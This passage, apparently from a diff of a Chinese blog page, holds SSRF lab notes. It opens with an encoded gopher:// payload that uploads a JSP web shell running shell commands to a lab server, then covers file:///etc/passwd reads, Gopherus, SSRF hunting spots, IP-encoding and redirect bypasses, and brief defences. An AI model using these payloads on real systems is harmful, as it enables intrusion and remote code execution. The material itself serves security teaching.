class="line">url=gopher://172.150.23.26:8080/_%25%35%30%25%35%35%25%35%34%25%32%30%25%32%66%25%33%31%25%32%65%25%36%61%25%37%33%25%37%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%31%25%33%35%25%33%30%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%36%25%33%61%25%33%38%25%33%30%25%33%38%25%33%30%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%32%61%25%32%66%25%32%61%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%36%35%25%36%65%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%36%33%25%36%66%25%36%64%25%37%30%25%36%31%25%37%34%25%36%39%25%36%32%25%36%63%25%36%35%25%33%62%25%32%30%25%34%64%25%35%33%25%34%39%25%34%35%25%32%30%25%33%39%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%36%25%32%65%25%33%31%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%33%62%25%32%30%25%35%34%25%37%32%25%36%39%25%36%34%25%36%35%25%36%65%25%37%34%25%32%66%25%33%35%25%32%65%25%33%30%25%32%39%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%34%25%33%36%25%33%30%25%30%61%25%30%61%25%33%63%25%32%35%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%30%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%30%25%33%64%25%32%30%25%37%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%32%65%25%36%37%25%36%35%25%37%34%25%35%30%25%36%31%25%37%32%25%36%31%25%36%64%25%36%35%25%37%34%25%36%35%25%37%32%25%32%38%25%32%32%25%36%33%25%36%64%25%36%34%25%32%32%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%36%39%25%36%36%25%32%38%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%30%25%32%31%25%33%64%25%32%30%25%36%65%25%37%35%25%36%63%25%36%63%25%32%39%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%61%25%36%31%25%37%36%25%36%31%25%32%65%25%36%39%25%36%66%25%32%65%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%30%25%36%39%25%36%65%25%33%64%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%65%25%36%37%25%36%35%25%37%34%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%38%25%32%39%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%32%38%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%39%25%32%65%25%36%37%25%36%35%25%37%34%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%38%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%39%25%36%65%25%37%34%25%32%30%25%36%31%25%32%30%25%33%64%25%32%30%25%32%64%25%33%31%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%35%64%25%32%30%25%36%32%25%32%30%25%33%64%25%32%30%25%36%65%25%36%35%25%37%37%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%33%32%25%33%30%25%33%34%25%33%38%25%35%64%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%33%63%25%37%30%25%37%32%25%36%35%25%33%65%25%32%32%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%37%25%36%38%25%36%39%25%36%63%25%36%35%25%32%38%25%32%38%25%36%31%25%33%64%25%36%39%25%36%65%25%32%65%25%37%32%25%36%35%25%36%31%25%36%34%25%32%38%25%36%32%25%32%39%25%32%39%25%32%31%25%33%64%25%32%64%25%33%31%25%32%39%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%36%63%25%36%65%25%32%38%25%36%65%25%36%35%25%37%37%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%36%32%25%32%39%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%33%63%25%32%66%25%37%30%25%37%32%25%36%35%25%33%65%25%32%32%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%32%30%25%36%35%25%36%63%25%37%33%25%36%35%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%36%36%25%36%66%25%37%32%25%36%64%25%36%31%25%37%34%25%33%61%25%32%30%25%37%38%25%37%38%25%37%38%25%32%65%25%36%61%25%37%33%25%37%30%25%33%66%25%36%33%25%36%64%25%36%34%25%33%64%25%34%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%32%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%30%61%25%32%35%25%33%65%25%30%61</span><br></pre></td></tr></table></figure>
+
+<p>原本目录下是没有1.jsp的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-14.png"></p>
+<p>发包后产生了1.jsp然后rce，拿下!</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-15.png"></p>
+<p><font style="background-color:#DF2A3F;">还有很多关卡，但是这节课就是为了让理解ssrf，这几关足够了</font></p>
+<h1 id="三、SSRF伪协议利用"><a href="#三、SSRF伪协议利用" class="headerlink" title="三、SSRF伪协议利用"></a>三、SSRF伪协议利用</h1><p><a target="_blank" rel="noopener" href="http://web常见访问,如http//127.0.0.1">http://Web常见访问，如http://127.0.0.1</a></p>
+<p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p>
+<p>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：</p>
+<p>s<a href="ftp://ssh文件传输协议或安全文件传输协议/">ftp://SSH文件传输协议或安全文件传输协议</a></p>
+<p>ldap:&#x2F;&#x2F; 轻量级目录访问协议</p>
+<p>tftp:&#x2F;&#x2F; 简单文件传输协议</p>
+<p>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</p>
+<p>由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）,<font style="background-color:#FBDE28;">格式：gopher:&#x2F;&#x2F;ip:port&#x2F;_， Gopherus工具的主要作用是在遇到SSRF漏洞时，能够生成对应的Gopher协议Payload，使得攻击者可以利用这种协议的特点对内网进行探测和利用。  </font></p>
+<p><font style="background-color:#ED740C;">应用：漏洞利用或信息收集 通讯相关服务的时候 工具：Gopherus</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-16.png"></p>
+<h1 id="四、SSRF漏洞挖掘"><a href="#四、SSRF漏洞挖掘" class="headerlink" title="四、SSRF漏洞挖掘"></a>四、SSRF漏洞挖掘</h1><p>黑盒探针：</p>
+<p>业务功能点</p>
+<p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
+<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
+<p>3.在线翻译：给网址翻译对应网页的内容</p>
+<p>4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
+<p>5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
+<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
+<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
+<p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
+<p>9.邮件系统：比如接收邮件服务器地址</p>
+<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
+<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<p>-URL关键参数</p>
+<p>share</p>
+<p>wap</p>
+<p>url</p>
+<p>link</p>
+<p>src</p>
+<p>source</p>
+<p>target</p>
+<p>u</p>
+<p>display</p>
+<p>sourceURl</p>
+<p>imageURL</p>
+<p>domain</p>
+<h1 id="五、SSRF绕过方式"><a href="#五、SSRF绕过方式" class="headerlink" title="五、SSRF绕过方式"></a>五、SSRF绕过方式</h1><p>-限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<p>采用http基本身份认证的方式绕过，即@</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxyy.com/">http://www.xxx.com@www.xxyy.com</a></p>
+<p>-限制请求IP不为内网地址</p>
+<p>当不允许ip为内网地址时：</p>
+<p>（1）采取短网址绕过</p>
+<p>（2）采取域名解析</p>
+<p>（3）采取进制转换</p>
+<p>（4）采取3XX重定向</p>
+<h1 id="六、SSRF漏洞防御"><a href="#六、SSRF漏洞防御" class="headerlink" title="六、SSRF漏洞防御"></a>六、SSRF漏洞防御</h1><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。</p>
+<p>2,统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
+<h1 id="七、SSRF过滤绕过"><a href="#七、SSRF过滤绕过" class="headerlink" title="七、SSRF过滤绕过"></a>七、SSRF过滤绕过</h1><p>CTFSHOW 白盒，ctfshow的vip太贵了我就不演示了，</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80027701/article/details/153080961">https://blog.csdn.net/2301_80027701&#x2F;article&#x2F;details&#x2F;153080961</a></p>
+<p>1、无过滤直接获取</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p>
+<p>2-3、IP地址进制绕过</p>
+<p>十六进制</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a></p>
+<p>八进制</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a></p>
+<p>10 进制整数格式</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a></p>
+<p>16 进制整数格式，还是上面那个网站转换记得前缀0x</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a></p>
+<p>还有一种特殊的省略模式</p>
+<p>127.0.0.1写成127.1</p>
+<p>用CIDR绕过localhost</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a></p>
+<p>还有很多方式</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a></p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p>
+<p>4、域名解析IP绕过</p>
+<p>test.xiaodi8.com-&gt;127.0.0.1</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://test.xiaodi8.com/flag.php">http://test.xiaodi8.com/flag.php</a></p>
+<p>5、长度限制IP绕过</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p>
+<p>6、长度限制IP绕过</p>
+<p>url&#x3D;<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a></p>
+<p>7、利用重定向解析绕过</p>
+<?php
+
+header("Location:http://127.0.0.1/flag.php");
+
+url=http://47.94.236.117/xx.php
+
+
+
+8、匹配且不影响写法解析
+
+url=http://ctf.@127.0.0.1/flag.php?show
+
+
+
+9-10、利用gopher协议打服务
+
+参考上述工具项目
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/08/09/%E7%AC%AC64%E5%A4%A9-CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-Referer%E5%90%8C%E6%BA%90-Token%E6%A0%A1%E9%AA%8C-%E5%A4%8D%E7%94%A8%E5%88%A0%E9%99%A4%E7%BD%AE%E7%A9%BA-%E8%81%94%E5%8A%A8%E4%B8%8A%E4%BC%A0%E6%88%96XSS/" rel="prev" title="第64天-CSRF跨站请求伪造&Referer同源&Token校验&复用删除置空&联动上传或XSS">
+      <i class="fa fa-chevron-left"></i> 第64天-CSRF跨站请求伪造&Referer同源&Token校验&复用删除置空&联动上传或XSS
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/09/10/%E7%AC%AC66%E5%A4%A9-SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0-%E5%8A%9F%E8%83%BD%E9%80%BB%E8%BE%91-SRC%E5%AE%9E%E8%B7%B5%E5%A4%8D%E7%9B%98-%E5%8F%82%E6%95%B0%E7%9B%B2%E6%B5%8B-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B-%E6%B5%81%E9%87%8F%E6%8F%92%E4%BB%B6/" rel="next" title="第66天-SSRF服务端伪造&功能逻辑&SRC实践复盘&参数盲测&自动化检测&流量插件">
+      第66天-SSRF服务端伪造&功能逻辑&SRC实践复盘&参数盲测&自动化检测&流量插件 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="w0aFeK3v2HV9LRG7Ubh6"></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+
+<livere-comment client-id="w0aFeK3v2HV9LRG7Ubh6"></livere-comment>
+<script type="module" src="https://www.livere.org/livere-widget.js"></script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">一、SSRF漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E9%9D%B6%E5%9C%BA-%E9%80%9A%E8%BF%87%E9%9D%B6%E5%9C%BA%E6%9D%A5%E5%AD%A6%E4%B9%A0%E6%94%BB%E5%87%BB%E5%85%B6%E4%BB%96%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.</span> <span class="nav-text">二、靶场(通过靶场来学习攻击其他内网服务器及服务)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="nav-number">2.1.</span> <span class="nav-text">1、靶场搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E9%9D%B6%E5%9C%BA%E5%86%85%E5%AE%B9"><span class="nav-number">2.2.</span> <span class="nav-text">2、靶场内容</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81http-172-150-23-22"><span class="nav-number">2.2.1.</span> <span class="nav-text">1、http:&#x2F;&#x2F;172.150.23.22</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81http-172-150-23-24"><span class="nav-number">2.2.2.</span> <span class="nav-text">2、http:&#x2F;&#x2F;172.150.23.24</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81http-172-150-23-26-8080"><span class="nav-number">2.2.3.</span> <span class="nav-text">3、http:&#x2F;&#x2F;172.150.23.26:8080</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81SSRF%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">三、SSRF伪协议利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81SSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">4.</span> <span class="nav-text">四、SSRF漏洞挖掘</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">5.</span> <span class="nav-text">五、SSRF绕过方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AD%E3%80%81SSRF%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="nav-number">6.</span> <span class="nav-text">六、SSRF漏洞防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%83%E3%80%81SSRF%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">7.</span> <span class="nav-text">七、SSRF过滤绕过</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="智高"
+      src="/images/photo.jpg">
+  <p class="site-author-name" itemprop="name">智高</p>
+  <div class="site-description" itemprop="description">正因为我有能力跨越，这个考验才会降临!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Spider-px" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Spider-px" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">智高</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='0,0,0' opacity='0.7' zIndex='' count='90' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+</body>
+</html>
